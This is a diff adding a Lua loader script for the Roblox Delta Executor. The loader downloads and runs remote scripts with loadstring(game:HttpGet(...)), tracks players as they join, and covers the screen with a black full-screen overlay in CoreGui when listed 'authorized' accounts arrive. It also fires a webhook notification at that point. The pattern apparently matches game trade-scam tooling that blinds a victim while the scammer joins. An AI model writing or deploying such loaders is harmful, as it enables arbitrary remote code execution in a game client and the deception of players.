@@ -1,0 +1,311 @@
+-- Zynx Syndicate Main Loader
+-- Combines: Webhook, Half Loading Screen, Full Loading Screen, CMD Line
+-- For Delta Executor
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+
+local MainLoader = {
+    components = {},
+    authorizedUsers = {
+        {username = "jaatshab_770", displayname = "III"},
+        {username = "boss_user2", displayname = "BOSS2"},
+        {username = "member_user1", displayname = "MEMBER1"}
+    },
+    currentScreen = "none",
+    isMonitoring = false
+}
+
+-- Load external scripts from GitHub
+function MainLoader.loadScript(url)
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet(url))()
+    end)
+    
+    if success then
+        print("✅ Successfully loaded: " .. url)
+        return result
+    else
+        warn("❌ Failed to load: " .. url)
+        warn("Error: " .. result)
+        return nil
+    end
+end
+
+-- Initialize all components
+function MainLoader.initialize()
+    print("🚀 Initializing Zynx Syndicate Main Loader...")
+    
+    -- Load Webhook system
+    MainLoader.components.webhook = MainLoader.loadScript("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/webhook.lua")
+    
+    -- Load Half Loading Screen
+    MainLoader.components.halfScreen = MainLoader.loadScript("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/half_loading.lua")
+    
+    -- Load Full Loading Screen  
+    MainLoader.components.fullScreen = MainLoader.loadScript("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/full_loading.lua")
+    
+    -- Load CMD Line system
+    MainLoader.components.cmdLine = MainLoader.loadScript("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/cmd_line.lua")
+    
+    -- Setup player detection
+    MainLoader.setupPlayerDetection()
+    
+    -- Start with half loading screen
+    MainLoader.showHalfLoadingScreen()
+    
+    -- Start monitoring for players
+    MainLoader.startPlayerMonitoring()
+    
+    print("✅ Zynx Syndicate Main Loader Initialized!")
+end
+
+-- Show half loading screen
+function MainLoader.showHalfLoadingScreen()
+    if MainLoader.currentScreen == "half" then return end
+    
+    print("🔄 Showing half loading screen...")
+    
+    -- Hide full screen if active
+    if MainLoader.currentScreen == "full" then
+        MainLoader.hideFullLoadingScreen()
+    end
+    
+    -- Execute half loading screen
+    if MainLoader.components.halfScreen then
+        -- The half loading screen should auto-run when loaded
+        MainLoader.currentScreen = "half"
+    else
+        warn("❌ Half loading screen not loaded properly")
+    end
+end
+
+-- Show full loading screen
+function MainLoader.showFullLoadingScreen()
+    if MainLoader.currentScreen == "full" then return end
+    
+    print("🎉 Switching to full loading screen (Authorized user detected)!")
+    
+    -- Hide half screen
+    MainLoader.hideHalfLoadingScreen()
+    
+    -- Execute full loading screen
+    if MainLoader.components.fullScreen then
+        -- The full loading screen should auto-run when loaded
+        MainLoader.currentScreen = "full"
+        
+        -- Send webhook notification
+        if MainLoader.components.webhook then
+            MainLoader.sendWebhookNotification()
+        end
+    else
+        warn("❌ Full loading screen not loaded properly")
+    end
+end
+
+-- Hide half loading screen
+function MainLoader.hideHalfLoadingScreen()
+    if MainLoader.components.halfScreen then
+        -- Destroy the half loading screen GUI
+        pcall(function()
+            local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
+            if playerGui then
+                local halfScreen = playerGui:FindFirstChild("ProfessionalLoadingScreen")
+                if halfScreen then
+                    halfScreen:Destroy()
+                end
+            end
+        end)
+    end
+end
+
+-- Hide full loading screen
+function MainLoader.hideFullLoadingScreen()
+    if MainLoader.components.fullScreen then
+        -- Destroy the full loading screen GUIs
+        pcall(function()
+            local coreGui = game:GetService("CoreGui")
+            local finalScreen = coreGui:FindFirstChild("FinalStageLoadingScreen")
+            local blackScreen = coreGui:FindFirstChild("BlackBackground")
+            
+            if finalScreen then finalScreen:Destroy() end
+            if blackScreen then blackScreen:Destroy() end
+        end)
+    end
+end
+
+-- Setup player detection with your system
+function MainLoader.setupPlayerDetection()
+    -- Set up the global trigger for full loading screen
+    _G.TriggerFullLoad = function()
+        MainLoader.showFullLoadingScreen()
+    end
+    
+    -- Set up authorized users for CMD line system
+    if _G.UpdateAuthorizedUsers then
+        _G.UpdateAuthorizedUsers(MainLoader.authorizedUsers)
+    end
+end
+
+-- Start player monitoring
+function MainLoader.startPlayerMonitoring()
+    if MainLoader.isMonitoring then return end
+    
+    print("🎯 Starting player monitoring...")
+    
+    -- Start your player detection system
+    if _G.StartPlayerMonitor then
+        _G.StartPlayerMonitor()
+        MainLoader.isMonitoring = true
+    else
+        -- Fallback: Use our own monitoring
+        MainLoader.startFallbackMonitoring()
+    end
+end
+
+-- Fallback player monitoring
+function MainLoader.startFallbackMonitoring()
+    spawn(function()
+        wait(3) -- Wait 3 seconds after script start
+        
+        print("🎯 Starting fallback player monitoring...")
+        
+        -- Monitor when players join
+        game.Players.PlayerAdded:Connect(function(player)
+            MainLoader.checkPlayerAuthorization(player)
+        end)
+        
+        -- Check existing players
+        for _, player in pairs(game.Players:GetPlayers()) do
+            MainLoader.checkPlayerAuthorization(player)
+        end
+        
+        print("✅ Fallback player monitoring active!")
+    end)
+end
+
+-- Check if player is authorized
+function MainLoader.checkPlayerAuthorization(player)
+    local playerName = player.Name
+    local displayName = player.DisplayName
+    
+    print("👤 Checking player: " .. playerName .. " | Display: " .. displayName)
+    
+    -- Check if player is authorized
+    for _, authUser in pairs(MainLoader.authorizedUsers) do
+        if player.Name == authUser.username or player.DisplayName == authUser.displayname then
+            print("🎉 AUTHORIZED USER JOINED: " .. playerName)
+            print("🚀 TRIGGERING FULL LOADING SCREEN!")
+            MainLoader.showFullLoadingScreen()
+            return true
+        end
+    end
+    
+    print("❌ Regular player: " .. playerName)
+    return false
+end
+
+-- Send webhook notification
+function MainLoader.sendWebhookNotification()
+    if not MainLoader.components.webhook then return end
+    
+    print("📢 Sending webhook notification...")
+    
+    -- The webhook system should auto-send when loaded
+    -- If it needs manual triggering, call its main function
+    if MainLoader.components.webhook.SendWebhook then
+        MainLoader.components.webhook.SendWebhook()
+    end
+end
+
+-- Add authorized user
+function MainLoader.addAuthorizedUser(username, displayname)
+    table.insert(MainLoader.authorizedUsers, {
+        username = username,
+        displayname = displayname
+    })
+    
+    -- Update CMD line system
+    if _G.AddAuthUser then
+        _G.AddAuthUser(username, displayname)
+    end
+    
+    print("✅ Added authorized user: " .. username .. " (" .. displayname .. ")")
+end
+
+-- Remove authorized user
+function MainLoader.removeAuthorizedUser(username)
+    for i, user in ipairs(MainLoader.authorizedUsers) do
+        if user.username == username then
+            table.remove(MainLoader.authorizedUsers, i)
+            print("✅ Removed authorized user: " .. username)
+            return true
+        end
+    end
+    print("❌ User not found: " .. username)
+    return false
+end
+
+-- List authorized users
+function MainLoader.listAuthorizedUsers()
+    print("📋 Authorized Users List:")
+    for i, user in pairs(MainLoader.authorizedUsers) do
+        print("   " .. i .. ". " .. user.username .. " (" .. user.displayname .. ")")
+    end
+end
+
+-- Command line interface for the main loader
+function MainLoader.cmdInterface()
+    return {
+        adduser = function(username, displayname)
+            MainLoader.addAuthorizedUser(username, displayname)
+        end,
+        
+        removeuser = function(username)
+            MainLoader.removeAuthorizedUser(username)
+        end,
+        
+        listusers = function()
+            MainLoader.listAuthorizedUsers()
+        end,
+        
+        reload = function()
+            print("🔄 Reloading all components...")
+            MainLoader.initialize()
+        end,
+        
+        status = function()
+            print("📊 Main Loader Status:")
+            print("   Current Screen: " .. MainLoader.currentScreen)
+            print("   Monitoring: " .. tostring(MainLoader.isMonitoring))
+            print("   Authorized Users: " .. #MainLoader.authorizedUsers)
+            print("   Components Loaded: " .. tostring(MainLoader.components ~= nil))
+        end,
+        
+        testfull = function()
+            print("🧪 Testing full loading screen...")
+            MainLoader.showFullLoadingScreen()
+        end,
+        
+        testhalf = function()
+            print("🧪 Testing half loading screen...")
+            MainLoader.showHalfLoadingScreen()
+        end
+    }
+end
+
+-- Auto-start the system
+spawn(function()
+    wait(2)
+    MainLoader.initialize()
+end)
+
+-- Make main loader accessible globally
+_G.MainLoader = MainLoader
+_G.ZynxCMD = MainLoader.cmdInterface()
+
+print("🎯 Zynx Syndicate Main Loader Script Loaded!")
+print("💡 Use ZynxCMD to access command functions")
+print("💡 Auto-starting in 2 seconds...")
+print("💡 Authorized users will trigger full loading screen")
